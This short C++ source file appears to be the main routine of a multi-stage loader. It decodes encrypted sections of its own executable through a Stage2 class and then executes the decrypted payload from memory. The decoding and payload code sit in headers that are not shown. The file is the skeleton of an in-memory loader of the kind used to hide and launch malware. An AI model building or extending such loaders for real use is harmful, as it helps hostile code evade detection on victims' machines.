
#include "stdafx.h"

#include "Stage1_generated.h" // For the source with stage 2 capabilities.
#include "Stage2.h"

int main(int argc, char* argv[]) {
    
    // ===== Stages need to be done in reverse order!
        
    Stage2 loader(argv[0]);
    if (!loader.decodeSections()) {
        printf("Stage 2 failed!\n");
        return 0;
    }

    // Execute decrypted function from stage 2. 
    // and run actual binary from memory.
    return !executePayload(); 
}